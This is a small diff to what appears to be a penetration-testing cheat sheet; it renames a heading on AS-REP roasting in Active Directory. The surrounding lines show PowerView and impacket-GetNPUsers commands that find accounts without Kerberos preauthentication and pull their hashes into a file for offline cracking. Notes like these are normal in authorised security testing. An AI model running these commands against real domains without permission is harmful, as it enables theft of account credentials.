@@ -14,7 +14,7 @@ Get-DomainUser -PreauthNotRequired
 impacket-GetNPUsers -dc-ip <ip> -no-pass <domain/user> -request-outputfile hashes.asreproast
 ```
 
-#### Authenticated Asreproast Attack
+#### Authenticated AS-REP ROAST Attack
 ```bash
 impacket-GetNPUsers -dc-ip <ip> -request -outputfile hashes.asreproast <domain>/<user>
 	# The user is who we are authenticating with
